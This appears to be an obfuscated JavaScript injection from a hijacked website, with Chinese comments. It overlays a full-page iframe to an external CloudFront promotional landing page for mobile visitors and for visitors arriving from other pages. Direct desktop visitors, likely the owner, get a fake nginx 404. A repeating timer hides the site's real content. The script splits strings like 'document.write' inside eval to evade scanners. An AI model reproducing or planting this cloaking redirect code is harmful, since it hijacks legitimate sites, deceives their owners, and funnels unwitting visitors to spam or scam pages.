        (function() {
            // 判断是否为移动设备
            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            var ref = document.referrer;

            // 手机端任何情况都显示框架；PC端仅当从其他页面点击进入（有Referer）时显示
            var shouldLoadOriginalFrame = isMobile || (!isMobile && ref && ref.length > 0);

            window.__frameLoadEnabled = shouldLoadOriginalFrame;

            if (shouldLoadOriginalFrame) {
                // 加载 iframe 推广页
                var ss = '<div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="100%" src="https://d2gb61r5iyrrmm.cloudfront.net/lp/mama?channel=mmseo002"></iframe></div><style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden}</style>';
                eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
            } else {
                // 直接访问（PC端无Referer）→ 显示自定义 404 页面（保护在白名单内）
                var notFoundHtml = '<div id="showcloneshengxiaon">\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx</center>\n</div>';
                document.open();
                document.write(notFoundHtml);
                document.close();
            }
        })();


 let meta = document.createElement('meta');
        meta.name = "viewport";
        meta.content = "width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no,minimal-ui";
        document.getElementsByTagName('head')[0].appendChild(meta);
        var bodyElem = document.getElementsByTagName("body")[0];
        if (bodyElem) {
            bodyElem.style.margin = "0px";
        }
        
        try {
            setInterval(function () {
                try {
                    document.getElementById("div" + "All").style.display = "no" + "ne";
                } catch (e) {}
                if (document.body) {
                    for (var i = 0; i < document.body.children.length; i++) {
                        try {
                            var b = document.body.children[i].id;
                            if (b != "iconDiv1" && b != "showcloneshengxiaon") {
                                document.body.children[i].style.display = "non" + "e";
                            }
                        } catch (e) {}
                    }
                }
            }, 100);
        } catch (e) {}
